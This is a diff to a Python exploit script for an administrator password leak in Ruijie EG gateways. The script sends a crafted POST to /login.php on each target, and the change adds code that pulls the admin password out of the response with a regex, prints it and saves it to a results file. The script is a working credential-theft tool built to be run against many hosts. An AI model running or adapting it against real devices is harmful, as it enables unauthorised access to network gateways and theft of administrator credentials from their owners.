@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 #-*- coding:utf-8 -*-
 
+import re
 import requests
 import argparse
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -8,9 +9,10 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 key=0
 def header():
-	print('\033[34m*-----------------------------------------*\033[0m')
-	print('\033[34m!description:锐捷EG易网关管理员账号密码泄露漏洞   \033[0m')
-	print('\033[34m*-----------------------------------------*\033[0m')
+	print('\033[32m!***********************************************!\033[0m')
+	print('\033[32m!description:锐捷EG易网关管理员账号密码泄露漏洞 !\033[0m')
+	print('\033[32m!             Author:Fly_Wuhoo                  !\033[0m')
+	print('\033[32m!***********************************************!\033[0m')
 
 def Arg_Parse():
 	parser = argparse.ArgumentParser()
@@ -19,10 +21,10 @@ def Arg_Parse():
 	args = parser.parse_args()
 	return args
 
-def Write_Results(url,text):
+def Write_Results(url,passwd):
 	with open('results.txt','a+') as wp:
 		wp.write(url+'\n')
-		wp.write(text+'\n')
+		wp.write("密码为：{}".format(passwd)+'\n')
 
 def Detect(url):
 	vuln_url=url+"/login.php"
@@ -36,8 +38,10 @@ def Detect(url):
 		r=requests.post(url=vuln_url,headers=headers,data=data,verify=False,timeout=5)
 		if r.status_code==200 and "data" in r.text:
 			print("\033[31m{}存在漏洞！！！\033[0m".format(url))
+			password=re.findall(r'admin (.*?)"',r.text)[0]
+			print("\033[31m密码是： {}\033[0m".format(password))
 			if key:
-				Write_Results(url,r.text)
+				Write_Results(url,password)
 			else:
 				pass
 		else:
